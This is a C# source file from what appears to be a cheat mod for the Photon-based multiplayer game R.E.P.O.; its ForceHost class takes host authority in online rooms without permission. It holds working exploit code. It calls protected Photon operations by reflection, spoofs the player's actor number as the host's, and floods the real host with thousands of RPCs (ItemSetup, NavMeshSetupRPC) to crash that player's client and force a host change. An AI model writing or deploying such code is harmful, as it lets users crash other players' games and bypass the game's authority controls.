using System;
using System.Collections;
using System.Collections.Generic;
using System.Reflection;
using ExitGames.Client.Photon;
using Photon.Pun;
using Photon.Realtime;
using UnityEngine;
using UnityEngine.SceneManagement;
using Hashtable = ExitGames.Client.Photon.Hashtable;

namespace r.e.p.o_cheat;

public class ForceHost : MonoBehaviourPunCallbacks
{
	public NetworkManager manager;
	public MenuManager menuManager;
	public PhotonView pview;

	private static ForceHost _instance;
	public static string statusMessage = "";
	private static bool isProcessing = false;
	private static bool _calledFromAutoAll = false;
	private static float _processingStartedAt;
	private const float ProcessingTimeout = 25f;

	private static int _savedActorNumber = -1;
	private static int _savedMasterClientId = -1;
	private static bool _localFakeActive;
	private static bool _spoofingActor;

	public static bool LocalFakeActive => _localFakeActive;

	// ─── NetworkManager 安全恢复 ─────────────────────────────
	private static NetworkManager _disabledNM;

	/// <summary>禁用 NetworkManager 并记录，便于安全恢复</summary>
	private static void SafeDisableNM()
	{
		try {
			NetworkManager nm = FindNetworkManager();
			if (nm != null) {
				((Behaviour)nm).enabled = false;
				_disabledNM = nm;
			}
		} catch { }
	}

	/// <summary>恢复之前禁用的 NetworkManager</summary>
	private static void SafeRestoreNM()
	{
		try {
			if (_disabledNM != null) {
				((Behaviour)_disabledNM).enabled = true;
				_disabledNM = null;
			}
			// 双重保险：还尝试查找并恢复
			NetworkManager nm = FindNetworkManager();
			if (nm != null && !((Behaviour)nm).enabled) {
				((Behaviour)nm).enabled = true;
			}
		} catch { }
	}

	private void Awake()
	{
		SceneManager.sceneLoaded += OnSceneLoaded;
	}

	private void Update()
	{
		TickSafety();
	}

	private void OnDestroy()
	{
		SceneManager.sceneLoaded -= OnSceneLoaded;
		ResetAuthorityState();
	}

	/// <summary>
	/// 场景切换时自动恢复 NetworkManager 并重置状态，防止加载卡死
	/// </summary>
	private void OnSceneLoaded(Scene scene, LoadSceneMode mode)
	{
		ResetAuthorityState();
	}

	// ─── 回调系统 ──────────────────────────────────────────
	/// <summary>
	/// 成功获取主机权限后的回调队列
	/// </summary>
	private static readonly Queue<Action> _onHostAcquiredCallbacks = new Queue<Action>();

	/// <summary>
	/// 注册一个回调，在成功获取主机权限后执行（一次性）
	/// </summary>
	public static void OnHostAcquired(Action callback)
	{
		if (callback == null) return;
		if (ShadowHostMode.IsTrueMasterClient())
		{
			callback();
			return;
		}
		_onHostAcquiredCallbacks.Enqueue(callback);
	}

	/// <summary>
	/// 清空所有待执行回调
	/// </summary>
	public static void ClearCallbacks() => _onHostAcquiredCallbacks.Clear();

	/// <summary>
	/// 执行所有待执行回调
	/// </summary>
	private static void FireCallbacks()
	{
		while (_onHostAcquiredCallbacks.Count > 0)
		{
			try { _onHostAcquiredCallbacks.Dequeue()?.Invoke(); }
			catch (Exception ex) { Debug.LogError("[ForceHost] 回调执行异常: " + ex.Message); }
		}
	}

	/// <summary>
	/// 当前是否正在进行主机夺取操作
	/// </summary>
	public static bool IsProcessing => isProcessing;

	public static ForceHost Instance
	{
		get
		{
			if ((Object)(object)_instance == (Object)null)
			{
				_instance = new GameObject("ForceHost").AddComponent<ForceHost>();
				Object.DontDestroyOnLoad((Object)(object)((Component)_instance).gameObject);
			}
			return _instance;
		}
	}

	public override void OnMasterClientSwitched(Player newMasterClient)
	{
		if (newMasterClient != null && newMasterClient.IsLocal)
		{
			statusMessage = L.T("room.force_success");
			Debug.Log("[ForceHost] 我们已成为主机!");
			FireCallbacks();
		}
	}

	public override void OnLeftRoom()
	{
		AntiKick.ResetVoluntaryFlag();
		ResetAuthorityState();
	}

	public override void OnDisconnected(DisconnectCause cause)
	{
		AntiKick.ResetVoluntaryFlag();
		ResetAuthorityState();
	}

	public override void OnJoinedRoom()
	{
		try
		{
			if (PhotonNetwork.LocalPlayer != null && PhotonNetwork.LocalPlayer.ActorNumber > 0)
			{
				_savedActorNumber = PhotonNetwork.LocalPlayer.ActorNumber;
			}
		}
		catch
		{
		}
	}

	public static void TickSafety()
	{
		if (isProcessing && Time.unscaledTime - _processingStartedAt > ProcessingTimeout)
		{
			isProcessing = false;
			_calledFromAutoAll = false;
			_spoofingActor = false;
			SafeRestoreNM();
			RestoreLocalIdentity();
			statusMessage = L.T("room.force_timeout");
		}
		if (!isProcessing)
		{
			SafeRestoreNM();
		}
		if (PhotonNetwork.InRoom && PhotonNetwork.LocalPlayer != null && !_spoofingActor)
		{
			int creator = ReadLocalAvatarCreatorActor();
			if (creator > 0)
			{
				_savedActorNumber = creator;
			}
			int actor = PhotonNetwork.LocalPlayer.ActorNumber;
			if (_savedActorNumber <= 0 && actor > 0)
			{
				_savedActorNumber = actor;
			}
			else if (_savedActorNumber > 0 && actor != _savedActorNumber)
			{
				RestoreLocalIdentity();
			}
			if (_localFakeActive)
			{
				RestoreLocalIdentity();
			}
			RepairLocalGrab();
		}
		if (ShadowHostMode.isEnabled && !_spoofingActor && PhotonNetwork.InRoom)
		{
			RestoreLocalIdentity();
		}
	}

	public static void ResetAuthorityState()
	{
		_calledFromAutoAll = false;
		isProcessing = false;
		_spoofingActor = false;
		SafeRestoreNM();
		RestoreLocalIdentity();
		_savedActorNumber = -1;
		_savedMasterClientId = -1;
		_localFakeActive = false;
	}

	public static void RestoreLocalIdentity()
	{
		if (_spoofingActor)
		{
			return;
		}
		try
		{
			if (PhotonNetwork.LocalPlayer != null && _savedActorNumber > 0)
			{
				FieldInfo actorField = typeof(Player).GetField("actorNumber", BindingFlags.Instance | BindingFlags.Public | BindingFlags.NonPublic);
				if (actorField != null)
				{
					int current = PhotonNetwork.LocalPlayer.ActorNumber;
					if (current != _savedActorNumber)
					{
						actorField.SetValue(PhotonNetwork.LocalPlayer, _savedActorNumber);
					}
				}
			}
			if (_localFakeActive && PhotonNetwork.InRoom && PhotonNetwork.CurrentRoom != null && _savedMasterClientId > 0)
			{
				Room room = PhotonNetwork.CurrentRoom;
				FieldInfo masterIdField = typeof(Room).GetField("masterClientId", BindingFlags.Instance | BindingFlags.NonPublic | BindingFlags.Public);
				masterIdField?.SetValue(room, _savedMasterClientId);
				FieldInfo isMasterField = typeof(Player).GetField("isMasterClient", BindingFlags.Instance | BindingFlags.NonPublic | BindingFlags.Public);
				if (isMasterField != null)
				{
					foreach (Player p in PhotonNetwork.PlayerList)
					{
						if (p == null)
						{
							continue;
						}
						isMasterField.SetValue(p, p.ActorNumber == _savedMasterClientId);
					}
				}
				_localFakeActive = false;
			}
			RepairLocalGrab();
		}
		catch
		{
		}
	}

	/// <summary>
	/// 确保我们是主机 — 如果已经是则直接执行回调，否则自动尝试夺取并在成功后执行
	/// </summary>
	public static void EnsureHost(Action onSuccess = null)
	{
		if (ShadowHostMode.IsTrueMasterClient())
		{
			onSuccess?.Invoke();
			return;
		}
		if (onSuccess != null) OnHostAcquired(onSuccess);
		if (!isProcessing)
		{
			Instance.StartCoroutine(Instance.Method_AutoAll());
		}
	}

	// ================================================================
	// 方法1: 标准 SetMasterClient（需要禁用 NetworkManager 防止干扰）
	// ================================================================
	public IEnumerator Method_SetMasterClient()
	{
		bool fromAutoAll = _calledFromAutoAll;
		if (!fromAutoAll)
		{
			if (isProcessing) yield break;
			isProcessing = true;
			_processingStartedAt = Time.unscaledTime;
		}

		if (!PhotonNetwork.InRoom)
		{
			statusMessage = L.T("room.force_fail");
			if (!fromAutoAll) isProcessing = false;
			yield break;
		}

		if (ShadowHostMode.IsTrueMasterClient())
		{
			statusMessage = L.T("room.already_host");
			if (!fromAutoAll) isProcessing = false;
			yield break;
		}

		statusMessage = L.T("room.forcing");
		SafeDisableNM();

		yield return (object)new WaitForSeconds(0.5f);

		bool sent = false;
		try { sent = PhotonNetwork.SetMasterClient(PhotonNetwork.LocalPlayer); }
		catch { }

		yield return (object)new WaitForSeconds(2f);
		SafeRestoreNM();

		if (!ShadowHostMode.IsTrueMasterClient())
			statusMessage = L.T("room.method_fail_fmt", "1 - SetMasterClient");
		if (!fromAutoAll) isProcessing = false;
	}

	// ================================================================
	// 方法2: 底层 Photon 操作 - 直接发送房间属性修改
	// 通过 LoadBalancingClient 绕过高级 API 限制
	// ================================================================
	public IEnumerator Method_LowLevelOp()
	{
		bool fromAutoAll = _calledFromAutoAll;
		if (!fromAutoAll)
		{
			if (isProcessing) yield break;
			isProcessing = true;
			_processingStartedAt = Time.unscaledTime;
		}

		if (!PhotonNetwork.InRoom)
		{
			statusMessage = L.T("room.force_fail");
			if (!fromAutoAll) isProcessing = false;
			yield break;
		}

		statusMessage = L.T("room.forcing");
		SafeDisableNM();

		yield return (object)new WaitForSeconds(0.3f);

		TryLowLevelSetMaster();

		yield return (object)new WaitForSeconds(2f);
		SafeRestoreNM();

		if (!ShadowHostMode.IsTrueMasterClient())
			statusMessage = L.T("room.method_fail_fmt", "2 - LowLevel Op");
		if (!fromAutoAll) isProcessing = false;
	}

	/// <summary>
	/// 通过反射调用受保护的 OpSetPropertiesOfRoom 方法
	/// </summary>
	private static bool TryLowLevelSetMaster()
	{
		try
		{
			Hashtable properties = new Hashtable();
			properties[(byte)248] = PhotonNetwork.LocalPlayer.ActorNumber;

			LoadBalancingClient client = PhotonNetwork.NetworkingClient;
			if (client == null) return false;

			// OpSetPropertiesOfRoom 是 protected，用反射调用
			MethodInfo opMethod = typeof(LoadBalancingClient).GetMethod("OpSetPropertiesOfRoom",
				BindingFlags.Instance | BindingFlags.Public | BindingFlags.NonPublic,
				null,
				new Type[] { typeof(Hashtable), typeof(Hashtable), typeof(WebFlags) },
				null);

			if (opMethod != null)
			{
				bool sent = (bool)opMethod.Invoke(client, new object[] { properties, null, null });
				Debug.Log("[ForceHost] Low-level OpSetPropertiesOfRoom (反射) 发送: " + sent);
				return sent;
			}
			else
			{
				// 备选: 尝试通过 LoadBalancingPeer 发送原始操作
				return TryRawPeerOperation(client, properties);
			}
		}
		catch (Exception ex)
		{
			Debug.LogError("[ForceHost] Low-level op 异常: " + ex.Message);
			return false;
		}
	}

	/// <summary>
	/// 备选: 通过 LoadBalancingPeer.OpCustom 发送原始操作
	/// </summary>
	private static bool TryRawPeerOperation(LoadBalancingClient client, Hashtable properties)
	{
		try
		{
			// 获取 LoadBalancingPeer
			PropertyInfo peerProp = typeof(LoadBalancingClient).GetProperty("LoadBalancingPeer",
				BindingFlags.Instance | BindingFlags.Public | BindingFlags.NonPublic);
			if (peerProp == null) return false;

			object peer = peerProp.GetValue(client);
			if (peer == null) return false;

			// 构建 SetProperties 操作参数 (OperationCode 252 = SetProperties)
			// ParameterCode.Properties = 251, ParameterCode.Broadcast = 250
			Dictionary<byte, object> opParams = new Dictionary<byte, object>();
			opParams[251] = properties;  // Properties
			opParams[250] = true;        // Broadcast

			// 调用 OpCustom(byte customOpCode, Dictionary<byte, object> customOpParameters, bool sendReliable)
			MethodInfo opCustom = peer.GetType().GetMethod("OpCustom",
				BindingFlags.Instance | BindingFlags.Public,
				null,
				new Type[] { typeof(byte), typeof(Dictionary<byte, object>), typeof(bool) },
				null);

			if (opCustom != null)
			{
				bool sent = (bool)opCustom.Invoke(peer, new object[] { (byte)252, opParams, true });
				Debug.Log("[ForceHost] Raw OpCustom(252) 发送: " + sent);
				return sent;
			}
		}
		catch (Exception ex)
		{
			Debug.LogError("[ForceHost] Raw peer op 异常: " + ex.Message);
		}
		return false;
	}

	// ================================================================
	// 方法3: ActorNumber 欺骗 + SetMasterClient
	// 利用 Troll.cs 已验证的反射技巧
	// ================================================================
	public IEnumerator Method_ActorNumberSpoof()
	{
		bool fromAutoAll = _calledFromAutoAll;
		if (!fromAutoAll)
		{
			if (isProcessing) yield break;
			isProcessing = true;
			_processingStartedAt = Time.unscaledTime;
		}

		if (!PhotonNetwork.InRoom || PhotonNetwork.MasterClient == null)
		{
			statusMessage = L.T("room.force_fail");
			if (!fromAutoAll) isProcessing = false;
			yield break;
		}

		statusMessage = L.T("room.forcing");
		SafeDisableNM();

		yield return (object)new WaitForSeconds(0.3f);

		DoActorNumberSpoof();

		yield return (object)new WaitForSeconds(2f);
		SafeRestoreNM();

		if (!ShadowHostMode.IsTrueMasterClient())
			statusMessage = L.T("room.method_fail_fmt", "3 - ActorSpoof");
		if (!fromAutoAll) isProcessing = false;
	}

	/// <summary>
	/// ActorNumber 欺骗逻辑（非协程，避免 yield + try-catch 冲突）
	/// </summary>
	private static void DoActorNumberSpoof()
	{
		int myActorNumber = 0;
		FieldInfo actorField = null;
		try
		{
			myActorNumber = PhotonNetwork.LocalPlayer.ActorNumber;
			int masterActorNumber = PhotonNetwork.MasterClient.ActorNumber;
			actorField = typeof(Player).GetField("actorNumber", BindingFlags.Instance | BindingFlags.NonPublic);

			if (actorField != null && myActorNumber != masterActorNumber)
			{
				_spoofingActor = true;
				_savedActorNumber = myActorNumber;
				actorField.SetValue(PhotonNetwork.LocalPlayer, masterActorNumber);

				PhotonNetwork.SetMasterClient(PhotonNetwork.LocalPlayer);

				Hashtable properties = new Hashtable();
				properties[(byte)248] = myActorNumber;
				TryLowLevelSetMasterWithProps(properties);
			}
		}
		catch (Exception ex)
		{
			Debug.LogError("[ForceHost] ActorNumber 欺骗异常: " + ex.Message);
		}
		finally
		{
			// 确保始终恢复真实的 ActorNumber
			if (actorField != null && myActorNumber > 0)
			{
				try { actorField.SetValue(PhotonNetwork.LocalPlayer, myActorNumber); }
				catch { }
			}
			_spoofingActor = false;
			Debug.Log("[ForceHost] ActorNumber 欺骗完成，已恢复");
		}
	}

	private static void TryLowLevelSetMasterWithProps(Hashtable properties)
	{
		try
		{
			LoadBalancingClient client = PhotonNetwork.NetworkingClient;
			if (client == null) return;

			MethodInfo opMethod = typeof(LoadBalancingClient).GetMethod("OpSetPropertiesOfRoom",
				BindingFlags.Instance | BindingFlags.Public | BindingFlags.NonPublic,
				null,
				new Type[] { typeof(Hashtable), typeof(Hashtable), typeof(WebFlags) },
				null);

			if (opMethod != null)
			{
				opMethod.Invoke(client, new object[] { properties, null, null });
			}
		}
		catch { }
	}

	// ================================================================
	// 方法4: 崩溃当前主机 → 等待自动提升
	// 最可靠但最具侵略性的方法
	// ================================================================
	public IEnumerator Method_CrashHost()
	{
		if (isProcessing) yield break;
		isProcessing = true;
		_processingStartedAt = Time.unscaledTime;

		if (!PhotonNetwork.InRoom || PhotonNetwork.MasterClient == null)
		{
			statusMessage = L.T("room.force_fail");
			isProcessing = false;
			yield break;
		}

		if (ShadowHostMode.IsTrueMasterClient())
		{
			statusMessage = L.T("room.already_host");
			isProcessing = false;
			yield break;
		}

		statusMessage = L.T("room.crashing_host");

		try
		{
			Player masterPlayer = PhotonNetwork.MasterClient;

			// 通过 LevelGenerator 的 RPC 崩溃主机
			LevelGenerator levelGen = Object.FindObjectOfType<LevelGenerator>();
			if ((Object)(object)levelGen != (Object)null)
			{
				for (int i = 0; i < 5000; i++)
				{
					levelGen.PhotonView.RPC("ItemSetup", masterPlayer, Array.Empty<object>());
					levelGen.PhotonView.RPC("NavMeshSetupRPC", masterPlayer, Array.Empty<object>());
				}
				Debug.Log("[ForceHost] 已向主机发送崩溃 RPC");
			}
			else
			{
				Debug.LogWarning("[ForceHost] 未找到 LevelGenerator，尝试 PhotonView 法");
				// 备选: 向主机发送大量无效RPC
				CrashPlayerByPhotonView(masterPlayer);
			}
		}
		catch (Exception ex)
		{
			Debug.LogError("[ForceHost] 崩溃主机异常: " + ex.Message);
		}

		// 等待主机断开连接并自动提升
		statusMessage = L.T("room.waiting_promotion");
		float waitTime = 0f;
		while (waitTime < 15f && !ShadowHostMode.IsTrueMasterClient())
		{
			yield return (object)new WaitForSeconds(0.5f);
			waitTime += 0.5f;
		}

		if (ShadowHostMode.IsTrueMasterClient())
			statusMessage = L.T("room.force_success");
		else
			statusMessage = L.T("room.method_fail_fmt", "4 - CrashHost");

		isProcessing = false;
	}

	// ================================================================
	// 方法5: 本地主机伪装 (仅修改本地标识，可发送主机专属RPC)
	// ================================================================
	/// <summary>
	/// Local IsMasterClient / actorNumber fakes do not make the server accept
	/// host RPCs (Photon checks the real sender). They do break grab and interact.
	/// </summary>
	public static bool Method_LocalMasterFake()
	{
		RestoreLocalIdentity();
		RepairLocalGrab();
		statusMessage = L.T("room.no_host_rpc_spoof");
		return false;
	}

	private static void RepairLocalGrab()
	{
		try
		{
			PhysGrabber grabber = PhysGrabber.instance;
			if ((Object)(object)grabber == (Object)null)
			{
				return;
			}
			PhotonView view = grabber.photonView;
			if ((Object)(object)view != (Object)null && view.IsMine && !grabber.isLocal)
			{
				grabber.isLocal = true;
			}
		}
		catch
		{
		}
	}

	private static int ReadLocalAvatarCreatorActor()
	{
		try
		{
			PlayerAvatar[] avatars = Object.FindObjectsOfType<PlayerAvatar>();
			if (avatars == null)
			{
				return -1;
			}
			foreach (PlayerAvatar avatar in avatars)
			{
				if ((Object)(object)avatar == (Object)null || (Object)(object)avatar.photonView == (Object)null)
				{
					continue;
				}
				PhotonView view = avatar.photonView;
				if (view.Owner != null && view.Owner.IsLocal && view.CreatorActorNr > 0)
				{
					return view.CreatorActorNr;
				}
			}
		}
		catch
		{
		}
		return -1;
	}

	// ================================================================
	// 方法6: 全自动 - 按顺序尝试所有方法
	// ================================================================
	public IEnumerator Method_AutoAll()
	{
		if (isProcessing) yield break;
		isProcessing = true;
		_processingStartedAt = Time.unscaledTime;
		try
		{
			if (!PhotonNetwork.InRoom)
			{
				statusMessage = L.T("room.force_fail");
				yield break;
			}

			if (ShadowHostMode.IsTrueMasterClient())
			{
				statusMessage = L.T("room.already_host");
				yield break;
			}

			statusMessage = L.T("room.trying_method_fmt", "1 - SetMasterClient");
			_calledFromAutoAll = true;
			yield return ((MonoBehaviour)Instance).StartCoroutine(Method_SetMasterClient());
			_calledFromAutoAll = false;
			if (ShadowHostMode.IsTrueMasterClient())
			{
				statusMessage = L.T("room.force_success");
				yield break;
			}

			yield return (object)new WaitForSeconds(0.5f);

			statusMessage = L.T("room.trying_method_fmt", "2 - LowLevel Op");
			_calledFromAutoAll = true;
			yield return ((MonoBehaviour)Instance).StartCoroutine(Method_LowLevelOp());
			_calledFromAutoAll = false;
			if (ShadowHostMode.IsTrueMasterClient())
			{
				statusMessage = L.T("room.force_success");
				yield break;
			}

			yield return (object)new WaitForSeconds(0.5f);

			statusMessage = L.T("room.trying_method_fmt", "3 - ActorSpoof");
			_calledFromAutoAll = true;
			yield return ((MonoBehaviour)Instance).StartCoroutine(Method_ActorNumberSpoof());
			_calledFromAutoAll = false;
			if (ShadowHostMode.IsTrueMasterClient())
			{
				statusMessage = L.T("room.force_success");
				yield break;
			}

			yield return (object)new WaitForSeconds(0.5f);

			statusMessage = ShadowHostMode.IsTrueMasterClient()
				? L.T("room.force_success")
				: L.T("room.auto_stopped");
		}
		finally
		{
			_calledFromAutoAll = false;
			isProcessing = false;
			SafeRestoreNM();
		}
	}

	// ================================================================
	// 保留旧方法兼容
	// ================================================================
	public IEnumerator ForceStart(string levelName)
	{
		// 安全顺序：先夺权再加载场景，避免场景不同步
		pview = GameObject.Find("Run Manager PUN").GetComponent<PhotonView>();
		SafeDisableNM();

		// Step 1: 先尝试夺取主机
		PhotonNetwork.SetMasterClient(PhotonNetwork.LocalPlayer);
		yield return (object)new WaitForSeconds(2f);

		if (!ShadowHostMode.IsTrueMasterClient())
		{
			// 夺权失败，不进行场景切换，避免卡加载
			SafeRestoreNM();
			statusMessage = "夺权失败，已取消强制开始";
			yield break;
		}

		// Step 2: 夺权成功后再加载场景
		PhotonNetwork.CurrentRoom.IsOpen = false;
		SteamManager.instance.LockLobby();
		DataDirector.instance.RunsPlayedAdd();
		pview.RPC("UpdateLevelRPC", (RpcTarget)0, new object[3] { levelName, 0, false });
		RunManager.instance.ChangeLevel(true, false, (RunManager.ChangeLevelType)1);

		yield return (object)new WaitForSeconds(1f);
		SafeRestoreNM();
	}

	// ================================================================
	// 辅助方法
	// ================================================================

	private static NetworkManager FindNetworkManager()
	{
		try
		{
			GameObject obj = GameObject.Find("Network Manager");
			return (obj != null) ? obj.GetComponent<NetworkManager>() : null;
		}
		catch { return null; }
	}

	/// <summary>
	/// 向目标玩家发送大量RPC使其崩溃（备选方案）
	/// </summary>
	private static void CrashPlayerByPhotonView(Player target)
	{
		try
		{
			PhotonView[] views = Object.FindObjectsOfType<PhotonView>();
			int count = 0;
			foreach (PhotonView pv in views)
			{
				if ((Object)(object)pv == (Object)null) continue;
				try
				{
					pv.RPC("ItemSetup", target, Array.Empty<object>());
					count++;
					if (count >= 3000) break;
				}
				catch { }
			}
			Debug.Log("[ForceHost] 已通过 PhotonView 发送 " + count + " 个崩溃 RPC");
		}
		catch { }
	}

	/// <summary>
	/// Honest RPC send only. Actor spoofing here left IsMasterClient / actorNumber
	/// desynced and broke heal, teleport, battery, and haul on other tabs.
	/// </summary>
	public static void SendRPCAsHost(PhotonView targetView, string rpcName, RpcTarget rpcTarget, params object[] args)
	{
		try
		{
			if ((Object)(object)targetView == (Object)null || !PhotonNetwork.InRoom)
			{
				return;
			}
			targetView.RPC(rpcName, rpcTarget, args);
		}
		catch (Exception ex)
		{
			Debug.LogError("[ForceHost] SendRPCAsHost 异常: " + ex.Message);
		}
	}
}
